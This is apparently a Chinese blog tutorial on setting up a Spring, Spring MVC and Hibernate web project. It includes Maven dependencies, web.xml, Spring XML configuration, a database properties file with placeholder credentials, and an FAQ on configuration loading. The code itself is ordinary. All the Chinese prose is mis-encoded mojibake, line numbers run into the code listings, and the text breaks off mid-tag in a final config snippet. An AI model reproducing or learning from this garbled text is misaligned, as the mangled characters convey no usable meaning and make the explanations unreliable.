ä¸ºå®ƒæœ¬èº«ä¹Ÿå±žäºŽSpringå®¶æ—ï¼Œæ–¹ä¾¿äº†å„ä¸ªæ¡†æž¶çš„é›†æˆï¼Œå¼€ç®±å³ç”¨ã€‚ SpringSpringæ˜¯ä¸€ä¸ªJavaå¼€å‘æ¡†æž¶ï¼Œç”¨æ¥ç®€åŒ–å¯¹è±¡ä¾èµ–ä»¥åŠç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚Springçš„æ ¸å¿ƒæ˜¯IOCï¼ˆæŽ§åˆ¶åè½¬ï¼‰å’ŒAOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰ï¼ŒIOCå®¹å™¨å¯ä»¥åˆ›å»ºå¹¶ç®¡ç†å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼ŒæŽ§åˆ¶åè½¬å°±æ˜¯å°†å¯¹è±¡çš„åˆ›å»ºä»¥åŠç”Ÿå‘½å‘¨æœŸäº¤ç»™Spring çš„IOCå®¹å™¨æ¥æŽ§åˆ¶ï¼ŒIOCä»Žå¦å¤–ä¸€ä¸ªè§’åº¦æ¥çœ‹ä¹Ÿå«åšä¾èµ–æ³¨å…¥ï¼Œåˆ©ç”¨è¿™ä¸€ç‰¹æ€§å¯ä»¥é™ä½Žç±»ä¹‹é—´çš„è€¦åˆåº¦ï¼Œå¹¶ä¸”é€šè¿‡Springæä¾›çš„AOPï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å®šä¹‰è‡ªå·±çš„è§„åˆ™ï¼Œå°†åˆ‡é¢åº”ç”¨äºŽæŸä¸ªæ–¹æ³•ä¸Šè¿›è¡Œæ–¹æ³•å¢žå¼ºï¼Œæ¯”å¦‚æ—¥å¿—è¾“å‡ºï¼Œäº‹ç‰©æŽ§åˆ¶ç­‰ã€‚Springçš„é…ç½®å¯ä»¥é‡‡ç”¨Javaç±»çš„æ–¹å¼ï¼Œä½†æ˜¯ä¸ºäº†é™ä½Žä¸Žç¨‹åºä»£ç çš„ä¾èµ–ï¼Œä¸€èˆ¬ä½¿ç”¨xmlå¤–éƒ¨é…ç½®æ–‡ä»¶æ¥é…ç½®Springã€‚ Spring MVCSpring MVC æ˜¯ç”¨äºŽwebç«¯çš„Servletå¼€å‘æ¡†æž¶ï¼Œç”¨æ¥ç®€åŒ–webç«¯ç¼–ç¨‹ã€‚åœ¨Spring MVCå‡ºçŽ°ä¹‹å‰ï¼ŒJavaçš„webç«¯ç¼–ç¨‹ä¸€èˆ¬é‡‡ç”¨æœåŠ¡å™¨å®¹å™¨æä¾›çš„åŽŸç”ŸAPIï¼Œæ¯”å¦‚Tomcatç­‰ä¸»æµæœåŠ¡å™¨éƒ½æ”¯æŒçš„Servletè§„èŒƒæ‰€æä¾›çš„å„ç§APIæŽ¥å£ï¼Œå¼€å‘è€…é€šè¿‡HttpServletRequestä¸ŽHttpServletResponseæŽ¥å£æä¾›çš„æ–¹æ³•æ¥æŽ¥æ”¶å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ä¸Žå“åº”è¯·æ±‚ã€‚å½“ä¸€ä¸ªé¡¹ç›®å¾ˆåºžå¤§ä¸”å¤æ‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¯¹Servletæä¾›çš„è¿™äº›æŽ¥å£è¿›è¡Œç»Ÿä¸€å°è£…ï¼Œæ¯”å¦‚è¯·æ±‚æ–¹å¼çš„å®šä¹‰ï¼Œè¯·æ±‚ä½“å‚æ•°çš„èŽ·å–ï¼Œè¯·æ±‚å“åº”å¯¹è±¡æ•°æ®ç­‰ã€‚Spring MVCå±è”½ä¸Žä¸šåŠ¡æ— å…³çš„åº•å±‚ä»£ç ï¼Œå¸®åŠ©å¼€å‘è€…åšäº†Servletçš„å°è£…ï¼Œå¹¶ä¸”ä¾èµ–Springçš„å¼ºå¤§ç‰¹æ€§ï¼Œå¼€å‘è€…åªéœ€è¦å°†è¯·æ±‚é…ç½®ç»™Spring MVCæä¾›çš„DispatcherServletï¼Œå°±å¯ä»¥åœ¨è‡ªå·±çš„ä¸šåŠ¡é€»è¾‘ä¸­ä½¿ç”¨Spring å’ŒSpringMVCå¸¦æ¥çš„å¼ºå¤§åŠŸèƒ½ HibernateHibernateæ˜¯ä¸€ä¸ªORMæ¡†æž¶ï¼Œç”¨æ¥ç®€åŒ–æ•°æ®åº“æ“ä½œã€‚åœ¨Hibernateå‡ºçŽ°ä¹‹å‰ï¼ŒJavaæ“ä½œæ•°æ®åº“ä¸€èˆ¬é‡‡ç”¨JDBCæä¾›çš„APIç›´æŽ¥åŽ»æ“ä½œï¼Œéœ€è¦è‡ªå·±ç¼–å†™å¤§é‡çš„SQLï¼Œå®¹æ˜“ä¸€ä¸å°å¿ƒå°±ç›´æŽ¥æ‹¼æŽ¥ä¸Šä¸€ä¸ªéžæ³•çš„å‚æ•°å˜é‡å¯¼è‡´SQLæ³¨å…¥ï¼Œè€Œä¸”æ¯æ¬¡å°†ç»“æžœé‡æ–°èµ‹å€¼ç»™Javaå¯¹è±¡æ˜¾å¾—éžå¸¸ç¹çï¼Œæ²¡æœ‰é€šç”¨æ€§ã€‚æ‰€ä»¥åœ¨é¡¹ç›®ä¸­ä¸€èˆ¬ä¼šå¯¹JDBCè¿›è¡Œå†æ¬¡å°è£…ï¼Œé‡‡ç”¨Javaåå°„ç­‰æŠ€æœ¯å®žçŽ°äº†ä¸€ä¸ªORMçš„åŠŸèƒ½ï¼Œè¿™ç§åŠŸèƒ½å’Œç›®å‰ä¸»æµçš„Hibernateä¸ŽMybatisç±»ä¼¼ï¼Œéƒ½å¯¹JDBCçš„æ•°æ®åº“æ“ä½œè¿›è¡Œäº†å°è£…ã€‚ä½†æ˜¯Hibernateæ›´ä¸ºå¼ºå¤§ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œå…³ç³»åž‹æ•°æ®åº“è™½ç„¶å°†çŽ°å®žäº‹ç‰©è¿›è¡Œäº†æŠ½è±¡ï¼Œä½†æ˜¯å…³ç³»åž‹æ•°æ®åº“çš„ä¼ ç»Ÿæ“ä½œè¿˜æ˜¯ä½¿ç”¨SQLï¼ŒSQLæœ¬èº«æ˜¯é¢å‘è¿‡ç¨‹çš„ï¼Œäººç±»åŽ»ç¼–å†™å¾ˆå¤æ‚çš„ä¸€ä¸²SQLæ—¶å¦‚æžœæ²¡æœ‰è¶³å¤Ÿçš„ç»éªŒå¾ˆå®¹æ˜“ä¼šå†™å‡ºBUGï¼Œæ¯”å¦‚å¤šè¡¨å…³è”æŸ¥è¯¢æ—¶å¯èƒ½è¦å†™å¾ˆé•¿çš„SQLï¼Œå¹¶ä¸”æ•´ä¸ªä¸šåŠ¡ç³»ç»Ÿå¯èƒ½æœ‰å¾ˆå¤šåœ°æ–¹æœ‰ç±»ä¼¼çš„æŸ¥è¯¢ï¼Œå¦‚æžœå…¨éƒ¨ç”¨SQLç¼–å†™å¯èƒ½å¾ˆè€—æ—¶ï¼Œæ‰€ä»¥å‡ºçŽ°äº†å…³ç³»å®žä½“æ˜ å°„çš„ORMæ¡†æž¶ã€‚Hibernateå¯¹SQLè¿›è¡Œäº†æŠ½è±¡ï¼Œå¼€å‘äººå‘˜ç›´æŽ¥æ“ä½œJavaå¯¹è±¡å°±å¯ä»¥æ“ä½œæ•°æ®åº“ï¼Œæœ€ç»ˆçš„SQLç”±Hibernateç¿»è¯‘ç”Ÿæˆï¼Œå¯¹è±¡æ“ä½œæ›´ä¸å®¹æ˜“å‡ºé”™ä¸”æ›´åŠ ç›´è§‚ã€‚é™¤æ­¤ä¹‹å¤–Hibernateè¿˜åšäº†å¾ˆå¤šå°è£…ï¼Œæ¯”å¦‚æ•°æ®åº“ä¸åŒçº§åˆ«çš„ç¼“å­˜ç­–ç•¥ï¼Œäº‹ç‰©ç­–ç•¥ç­‰ï¼Œæ¡†æž¶æœ¬èº«æ˜¯ä¸ºäº†ç®€åŒ–å¼€å‘æˆæœ¬ã€‚ åˆ›å»ºé¡¹ç›®å¼€å‘å·¥å…·å’Œæ¡†æž¶ç‰ˆæœ¬ æ“ä½œç³»ç»Ÿ: MacOS Mojave 10.14 JDKç‰ˆæœ¬: 1.8.0_192 IntelliJ IDEAç‰ˆæœ¬: Ultimate 2018.2.5 Mavenç‰ˆæœ¬: 3.3.9 Spring 5.1.1.RELEASE Spring MVC 5.1.1.RELEASE Hibernate 5.3.7.Final æ— è®ºé‡‡ç”¨IDEAè¿˜æ˜¯Eclipseï¼Œåœ¨ä½¿ç”¨Mavenæž„å»ºé¡¹ç›®æ—¶ï¼Œå‹¾é€‰Create from archetypeï¼Œé€‰æ‹©ä»Žæ¨¡æ¿åˆ›å»ºå¹¶æ‰¾åˆ° org.apache.maven.archetypes:maven-archetype-webappè¿™ä¸ªæ¨¡æ¿åº•ä¸‹çš„maven-archetype-webapp:RELEASEï¼Œç”¨æ¥å¿«é€Ÿåˆ›å»ºä¸€ä¸ªMavenæž„å»ºçš„Java Webå·¥ç¨‹ã€‚æœ‰å…³Springçš„ç›¸å…³æ–‡æ¡£å¯æŸ¥é˜…å®˜ç½‘https://docs.spring.io/spring/docs/5.1.1.RELEASE/spring-framework-reference/index.html å¼•å…¥ä¾èµ–pom.xml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!-- æ·»åŠ  Spring MVC ä¾èµ– --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.1.1.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- æ·»åŠ  Spring ORM ä¾èµ– --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-orm&lt;/artifactId&gt; &lt;version&gt;5.1.1.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- æ·»åŠ  Hibernate ä¾èµ– --&gt; &lt;dependency&gt; &lt;groupId&gt;org.hibernate&lt;/groupId&gt; &lt;artifactId&gt;hibernate-agroal&lt;/artifactId&gt; &lt;version&gt;5.3.7.Final&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt; &lt;!-- æ·»åŠ  C3P0 æ•°æ®åº“è¿žæŽ¥æ± ä¾èµ– --&gt; &lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.5.2&lt;/version&gt; &lt;/dependency&gt; &lt;!--æ·»åŠ  MySQL è¿žæŽ¥é©±åŠ¨ä¾èµ– --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.13&lt;/version&gt; &lt;/dependency&gt; &lt;!-- æ·»åŠ  jackson-core ä¾èµ– --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt; &lt;/dependency&gt; &lt;!-- æ·»åŠ  jackson-databind ä¾èµ– --&gt; &lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt; &lt;/dependency&gt; é…ç½®web.xmlweb.xml123456789101112131415161718192021222324252627282930313233&lt;web-app&gt; &lt;display-name&gt;SSH æ¡†æž¶æ•´åˆ&lt;/display-name&gt; &lt;!-- é…ç½®Springçš„ç›‘å¬å™¨ï¼ŒSpring å®¹å™¨å¯åŠ¨æ—¶é»˜è®¤ä¼šåŠ è½½ WEB-INF ç›®å½•ä¸‹çš„ applicationContext.xml æ–‡ä»¶ --&gt; &lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;!--å½“ WEB-INF ç›®å½•ä¸‹çš„ applicationContext.xml æ–‡ä»¶ä¸å­˜åœ¨æ—¶ï¼Œä¸€å®šè¦æŒ‡å®šè‡ªå®šä¹‰åç§°çš„é…ç½®æ–‡ä»¶--&gt; &lt;!-- å®šä¹‰è‡ªå®šä¹‰åç§°çš„ Spring ä¸Šä¸‹æ–‡é…ç½®æ–‡ä»¶--&gt; &lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-context.xml&lt;/param-value&gt; &lt;/context-param&gt; &lt;!--é…ç½® Spring MVC çš„ servlet æ‹¦æˆªå™¨--&gt; &lt;servlet&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;!--é…ç½®åˆå§‹åŒ–æ—¶è¦åŠ è½½çš„è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œå¦‚æžœä¸é…ç½®åˆ™é»˜è®¤ä¸º WEB-INF ç›®å½•ä¸‹çš„ app-servlet.xml æ–‡ä»¶--&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-webmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt; &lt;/servlet&gt; &lt;!-- é…ç½®servletæ˜ å°„æ‰€åŒ¹é…çš„url --&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; é…ç½® SpringWEB-INF/app-context.xml1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd"&gt; &lt;description&gt;Spring é…ç½®&lt;/description&gt; &lt;!-- åŠ è½½å¤–éƒ¨é…ç½®æ–‡ä»¶ --&gt; &lt;bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"&gt; &lt;property name="locations"&gt; &lt;list&gt; &lt;!-- å¦‚æžœæœ‰å¤šä¸ªé…ç½®æ–‡ä»¶å¯ä»¥ç”¨å¤šä¸ªvalueæ ‡ç­¾è¿›è¡Œé…ç½® --&gt; &lt;value&gt;classpath:db.properties&lt;/value&gt; &lt;/list&gt; &lt;/property&gt; &lt;/bean&gt; &lt;!-- é…ç½®æ•°æ®æº dataSource --&gt; &lt;bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource"&gt; &lt;!-- é…ç½®è¿žæŽ¥æ± åŸºç¡€ä¿¡æ¯ï¼šè¿žæŽ¥é©±åŠ¨ã€è¿žæŽ¥åœ°å€ã€ç”¨æˆ·åã€å¯†ç  --&gt; &lt;property name="driverClass" value="$&#123;jdbc.driverClass&#125;"/&gt; &lt;property name="jdbcUrl" value="$&#123;jdbc.url&#125;"/&gt; &lt;property name="user" value="$&#123;jdbc.user&#125;"/&gt; &lt;property name="password" value="$&#123;jdbc.password&#125;"/&gt; &lt;!-- åˆå§‹åŒ–è¿žæŽ¥æ± è¿žæŽ¥æ•°å¤§å°ï¼Œé»˜è®¤å€¼ä¸º3 --&gt; &lt;property name="initialPoolSize" value="$&#123;initialPoolSize&#125;"/&gt; &lt;!-- æœ€å¤§ç©ºé—²æ—¶é—´ï¼Œä¸º0åˆ™æ°¸ä¸ä¸¢å¼ƒï¼Œé»˜è®¤å€¼ä¸º0 --&gt; &lt;property name="maxIdleTime" value="$&#123;maxIdleTime&#125;"/&gt; &lt;!-- è¿žæŽ¥æ± çš„æœ€å¤§è¿žæŽ¥æ•°ï¼Œé»˜è®¤æœ€å¤§å€¼ä¸º15 --&gt; &lt;property name="maxPoolSize" value="$&#123;maxPoolSize&#125;"/&gt; &lt;!-- è¿žæŽ¥æ± ä¸­ä¿æŒçš„æœ€å°è¿žæŽ¥æ•°ï¼Œé»˜è®¤å€¼ä¸º3 --&gt; &lt;property name="minPoolSize" value="$&#123;minPoolSize&#125;"/&gt; &lt;!-- æ›´å¤šé…ç½®ä»¥åŠé»˜è®¤å€¼å¯æŸ¥çœ‹c3p0ä¾èµ–åº“ä¸­çš„ com.mchange.v2.c3p0.impl.C3P0Defaultsç±» --&gt; &lt;/bean&gt; &lt;!-- é…ç½®ä¼šè¯å·¥åŽ‚ SessionFactory --&gt; &lt;bean id="sessionFactory" class="org.springframework.orm.hibernate5.LocalSessionFactoryBean"&gt; &lt;!--é…ç½®æ•°æ®æº--&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;!--é…ç½® Hibernateå±žæ€§--&gt; &lt;property name="hibernateProperties"&gt; &lt;props&gt; &lt;!-- hibernate æ–¹è¨€ --&gt; &lt;prop key="hibernate.dialect"&gt;$&#123;hibernate.dialect&#125;&lt;/prop&gt; &lt;prop key="hibernate.show_sql"&gt;$&#123;hibernate.show_sql&#125;&lt;/prop&gt; &lt;prop key="hibernate.format_sql"&gt;$&#123;hibernate.format_sql&#125;&lt;/prop&gt; &lt;prop key="hibernate.hbm2ddl.auto"&gt;$&#123;hibernate.hbm2ddl.auto&#125;&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;!-- é…ç½®è¦æ‰«æçš„åŒ…è·¯å¾„ --&gt; &lt;property name="packagesToScan" value="com.lanshiqin.*.entity"/&gt; &lt;/bean&gt; &lt;!-- é…ç½®äº‹ç‰©ç®¡ç† transactionManager --&gt; &lt;bean id="transactionManager" class="org.springframework.orm.hibernate5.HibernateTransactionManager"&gt; &lt;!-- é…ç½® SessionFactory --&gt; &lt;property name="sessionFactory" ref="sessionFactory"/&gt; &lt;/bean&gt; &lt;!-- é…ç½®äº‹åŠ¡ï¼Œä½¿äº‹åŠ¡æ³¨è§£ç”Ÿæ•ˆ é»˜è®¤å±žæ€§å€¼ transaction-manager="transactionManager"ï¼Œå› ä¸ºä¸Šé¢é…ç½®äº†é¢„å®šçš„é»˜è®¤åç§°ï¼Œæ•…æ­¤å¤„å¯çœç•¥ --&gt; &lt;tx:annotation-driven/&gt;&lt;/beans&gt; é…ç½® Spring MVCWEB-INF/app-webmvc.xml1234567891011121314151617181920212223242526272829303132&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd"&gt; &lt;description&gt;Spring MVC é…ç½®&lt;/description&gt; &lt;!-- é…ç½®æ‰«ææ³¨è§£çš„ç›®å½• --&gt; &lt;context:component-scan base-package="com.lanshiqin"/&gt; &lt;!-- é…ç½®å†…éƒ¨èµ„æºåˆ†é…å™¨ï¼Œä¸ºæ¨¡åž‹è§†å›¾åç§°æ·»åŠ å‰ç½®è·¯å¾„å’ŒåŽç¼€åç§° --&gt; &lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix" value="/templates/"/&gt; &lt;property name="suffix" value=".jsp"/&gt; &lt;/bean&gt; &lt;!-- é…ç½®é»˜è®¤çš„servletï¼Œå¤„ç†ç¨‹åºå°†æ‰€æœ‰çš„è¯·æ±‚è½¬å‘åˆ°é»˜è®¤å¤„ç†å™¨ï¼Œå¤„ç†é™æ€èµ„æº --&gt; &lt;mvc:default-servlet-handler/&gt; &lt;!-- é…ç½®æ¶ˆæ¯è§†å›¾è½¬æ¢ --&gt; &lt;mvc:annotation-driven&gt; &lt;mvc:message-converters&gt; &lt;bean class="org.springframework.http.converter.StringHttpMessageConverter"/&gt; &lt;bean class="org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"/&gt; &lt;/mvc:message-converters&gt; &lt;/mvc:annotation-driven&gt;&lt;/beans&gt; é…ç½®Hibernateåœ¨Springçš„é…ç½®æ–‡ä»¶app-context.xmlä¸­å…¶å®žå·²ç»é…ç½®äº†Hibernateçš„ä¸€äº›å®žä¾‹å±žæ€§ï¼Œåº”ç”¨ç¨‹åºçš„è¿žæŽ¥æ± ä»¥åŠHibernateçš„SessionFactoryå’Œäº‹åŠ¡ç®¡ç†ç­‰ï¼Œè¿™é‡Œæ˜¯å°†xmlä¸­çš„é…ç½®æå–åˆ°å¤–éƒ¨æ–‡ä»¶ï¼Œæ–¹ä¾¿åŽæœŸå¯¹è¿™äº›é…ç½®å‚æ•°çš„ä¿®æ”¹å’Œè°ƒæ•´ã€‚resources/db.properties1234567891011121314151617181920212223242526# æ•°æ®åº“é…ç½®jdbc.driverClass=com.mysql.cj.jdbc.Driverjdbc.url=jdbc:mysql://localhost:3306/sshjdbc.user=xxxxjdbc.password=xxxxxx# åˆå§‹åŒ–è¿žæŽ¥æ± è¿žæŽ¥æ•°å¤§å°initialPoolSize=3# æœ€å¤§ç©ºé—²æ—¶é—´ï¼Œè¶…å€¼ä¸¢å¼ƒè¿žæŽ¥maxIdleTime=60# è¿žæŽ¥æ± çš„æœ€å¤§è¿žæŽ¥æ•°maxPoolSize=50# è¿žæŽ¥æ± ä¸­ä¿æŒçš„æœ€å°è¿žæŽ¥æ•°minPoolSize=3# hibernate æ–¹è¨€hibernate.dialect=org.hibernate.dialect.MySQL8Dialecthibernate.show_sql=truehibernate.format_sql=truehibernate.hbm2ddl.auto=update å¸¸è§é—®é¢˜pom.xml ä¸­çš„ä¾èµ–åœ¨pom.xmlä¸­æœ‰å…³Springçš„ä¾èµ–ä¸­ï¼Œä¸ºä½•åªå¼•å…¥äº†Spring MVC å’Œ Spring ORM çš„ä¾èµ–ï¼Ÿå› ä¸º Spring MVC ä¾èµ–äºŽ Spring Coreã€Spring Beanã€Spring Context ç­‰å…¶ä»–åŸºç¡€æ¨¡å—ï¼Œæ‰€ä»¥å¼•å…¥ä¸€ä¸ª Spring MVC ä¾èµ–ï¼Œmavenä¼šå°†å…¶å…³è”çš„ä¾èµ–ä¸€èµ·å¼•å…¥ã€‚ç”±ä¸Šå›¾å¯çŸ¥ï¼ŒSpringæ¨¡å—å…³ç³»é¡¶å±‚åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œä¸€ä¸ªæ˜¯ç”¨äºŽwebå¼€å‘çš„Spring MVCï¼Œå¦ä¸€ç±»ä¸Žæ•°æ®ç›¸å…³çš„ï¼Œåº•å±‚çš„å¤§éƒ¨åˆ†åŸºç¡€æ¨¡å—éƒ½æ˜¯å…±åŒéœ€è¦çš„ï¼Œå¼€å‘è€…å¯ä»¥æ ¹æ®è‡ªå·±éœ€è¦å¼•å…¥ç›¸å…³çš„æ¨¡å—ã€‚ ä¸ºä½•è¦å•ç‹¬å¼•å…¥fasterxmlçš„jacksonçš„coreå’Œdatabadingä¾èµ–ï¼Œä¸æ·»åŠ ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿå› ä¸ºåŽç«¯æŽ¥å£å¼€å‘ç›®å‰åŸºæœ¬éƒ½æœ‰éœ€è¦è¾“å‡ºJsonæ ¼å¼çš„æ•°æ®åœºæ™¯ï¼Œæ‰€ä»¥éœ€è¦åœ¨Springä¸­é…ç½®æ¶ˆæ¯è§†å›¾è½¬æ¢å™¨ï¼ŒSpringé»˜è®¤æ²¡æœ‰Jsonåºåˆ—åŒ–çš„å®žçŽ°ï¼Œæ‰€ä»¥å¦‚æžœä¸æ·»åŠ jsonçš„ç›¸å…³ä¾èµ–åº“ï¼Œå°†æ— æ³•å¤„ç†jsonè½¬æ¢ç›¸å…³çš„åŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨ä½¿ç”¨ @ResponseBodyæ³¨è§£æ—¶ä¸ä¼šè¢«è§£æžï¼Œå¦‚æžœé…ç½®äº†è§†å›¾è§£æžå™¨ä¸ºjsonï¼Œé‚£ä¹ˆä¼šå› ä¸ºæ‰¾ä¸åˆ°jsonä¾èµ–åº“åœ¨å®¹å™¨å¯åŠ¨æ—¶æŠ›å‡ºå¼‚å¸¸ã€‚ web.xml çš„é…ç½®listeneræ ‡ç­¾ä¸­é…ç½®çš„Springçš„ContextLoaderListeneræœ‰ä»€ä¹ˆä½œç”¨ï¼Œä¸ºä»€ä¹ˆè¦é…ç½®è¿™ä¸ªå‚æ•°ï¼Ÿ123&lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;&lt;/listener&gt; ContextLoaderListeneræ˜¯Springçš„ä¸Šä¸‹æ–‡åŠ è½½ç›‘å¬å™¨ï¼Œå¼€å‘è€…é€šè¿‡è¯¥ç›‘å¬å™¨å¯ä»¥å®žçŽ°ä¸€äº›è‡ªå®šä¹‰åŠŸèƒ½ã€‚å¦å¤–å¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯è¯¥é…ç½®ä¼šä½¿Spring å®¹å™¨å¯åŠ¨æ—¶é»˜è®¤åŠ è½½ WEB-INF ç›®å½•ä¸‹çš„ applicationContext.xml æ–‡ä»¶ï¼Œå¦‚æžœä¸æƒ³æŒ‰ç…§çº¦å®šåˆ›å»ºè¿™ä¸ªæ–‡ä»¶ï¼Œåˆ™å¿…é¡»è¦è‡ªå·±æŒ‡å®šé…ç½®æ–‡ä»¶ã€‚æœ‰å…³å¦‚ä½•æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œè¯·ç»§ç»­å¾€ä¸‹çœ‹ã€‚ ä¸ºä½•è¦é…ç½®contextConfigLocationè¿™ä¸ªå‚æ•°1234&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-context.xml&lt;/param-value&gt;&lt;/context-param&gt; å› ä¸ºåœ¨listeneræ ‡ç­¾ä¸­é…ç½®äº†ContextLoaderListenerï¼Œæ‰€ä»¥Spring å®¹å™¨å¯åŠ¨æ—¶é»˜è®¤ä¼šåŠ è½½ WEB-INF ç›®å½•ä¸‹çš„ applicationContext.xmlæ–‡ä»¶ï¼Œ ç”±äºŽ WEB-INF ç›®å½•ä¸‹ æ²¡æœ‰ applicationContext.xml è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œæ‰€ä»¥å®¹å™¨å¯åŠ¨æ—¶ä¼šæŠ›å‡ºIOå¼‚å¸¸ã€‚java.io.FileNotFoundException: Could not open ServletContext resource [/WEB-INF/applicationContext.xml]ï¼Œè¦é¿å…è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦åœ¨ WEB-INF ç›®å½•ä¸‹å»ºç«‹ applicationContext.xmlæ–‡ä»¶ã€‚å¦‚æžœå¼€å‘è€…ä¸æƒ³åˆ›å»º applicationContext.xmlæ–‡ä»¶ï¼Œå°±å¿…é¡»é€šè¿‡contextConfigLocationå‚æ•°æŒ‡å®šè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ã€‚ ä¸ºä½•åœ¨&lt;servlet&gt;æ ‡ç­¾ä¸­é…ç½®&lt;init-param&gt;åˆå§‹åŒ–å‚æ•°å¹¶ä¸”æŒ‡å®šcontextConfigLocationé…ç½®ï¼Ÿè¿™ä¸ªå’Œä¸Šé¢çš„é…ç½®ä¸æ˜¯é‡å¤äº†å—ï¼Ÿ123456789&lt;servlet&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-webmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; å› ä¸ºè¿™ä¸ªservleté…ç½®çš„æ˜¯Spring MVC çš„DispatcherServletï¼Œå®žä¾‹åˆ›å»ºæ—¶é»˜è®¤ä¼šåŠ è½½/WEB-INF/app-servlet.xml,å¦‚æžœå¼€å‘è€…åœ¨å¯¹åº”ç›®å½•ä¸‹åˆ›å»ºäº†è¯¥æ–‡ä»¶ï¼Œåˆ™å¯ä»¥ä¸éœ€è¦é…ç½®è¿™ä¸ªåˆå§‹åŒ–å‚æ•°ã€‚å¦‚æžœä¸åˆ›å»º/WEB-INF/app-servlet.xmlï¼Œåˆ™ä¼šæŠ›å‡ºIOå¼‚å¸¸java.io.FileNotFoundException: Could not open ServletContext resource [/WEB-INF/app-servlet.xml]ã€‚å¦‚æžœä¸æƒ³åˆ›å»º/WEB-INF/app-servlet.xml,å°±å¿…é¡»åœ¨DispatcherServletæ‰€åœ¨çš„servletæ ‡ç­¾ä¸­é…ç½®è‡ªå®šä¹‰æ–‡ä»¶ springé…ç½®æ–‡ä»¶é—®é¢˜InternalResourceViewResolver12345&lt;!-- é…ç½®å†…éƒ¨èµ„æºåˆ†é…å™¨ï¼Œä¸ºæ¨¡åž‹è§†å›¾åç§°æ·»åŠ å‰ç½®è·¯å¾„å’ŒåŽç¼€åç§° --&gt;&lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix" value="/templates/"/&gt; &lt;property name="suffix" 